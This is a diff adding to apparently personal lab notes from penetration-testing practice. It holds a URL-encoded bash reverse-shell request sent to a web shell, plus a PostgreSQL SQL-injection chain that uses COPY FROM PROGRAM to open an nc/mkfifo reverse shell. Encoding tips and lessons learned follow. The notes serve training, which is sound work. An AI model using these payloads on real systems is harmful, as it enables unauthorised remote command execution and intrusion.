@@ -284,8 +284,39 @@ Then I used the following request url to get shell
 
 http://10.x.x.x/x4.php?cmd=%62%61%73%68%20%2d%63%20%22%62%61%73%68%20%2d%69%20%3e%26%20%2f%64%65%76%2f%74%63%70%2f%31%39%32%2e%31%36%38%2e%34%35%2e%32%34%39%2f%34%34%34%34%20%30%3e%26%31%22
 
+4)
+a) send to victim
+payload
+';CREATE TABLE shell(output text);+--+//
 
+entire parameter with payload encoded
+SOMEPARAMETER='%3bCREATE+TABLE+shell(output+text)%3b+--+//
+note: seems like encoding ;'s has no effect on payload functionality.
 
+b) open nc listener on box
+nc -lvnp 1234
+
+c) start remote session
+payload
+';COPY shell FROM PROGRAM 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <ATTACKERIP> 1234 >/tmp/f';+--+//
+
+entire parameter with payload encoded
+SOMEPARAMETER=';COPY+shell+FROM+PROGRAM+'rm+/tmp/f%3bmkfifo+/tmp/f%3bcat+/tmp/f|/bin/sh+-i+2>%261|nc+<ATTACKERIP>+1234+>/tmp/f'%3b+--+//&gender=Male&email=test%40test.com
+
+Hackers Note: Beware copy pasting payloads from blogs. Sometimes they use infuriatingly use ’ instead of ' for quotes which breaks the payload
+
+Also testing shows that encoding the cut-off +--+// breaks the payload as well
+
+from this lab I learned the following
+1) you can just close out a statement using ';'
+2) a union attack can potentially be converted into straight RCE by using 1). Remember to close out statements with a ';' at the end as well.
+3) sometimes payloads have to be executed one line at a time
+4) You can make a pipe using mkfifo. This creates a special file that only lives in the RAM not on storage
+5) You can write and read from these pipes similar to a regular file however once it is read, the data is gone
+6) +--+// may be to stay unencoded for some payloads to work. In this lab, payloads would not work at all with that part encoded
+7) when copy pasting payloads, make sure no non-standard characters are being used for a fancy font. In this example medium used ’ instead of '. 
+Though to be honest, this payload is straight from the PayloadAllThings repo, and it does not have this potential issue. 
+7.5) get payloads from the source, not some hack writing a medium blog.
 <><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><>><><  
 <><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><>><><  
 <><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><>><><  
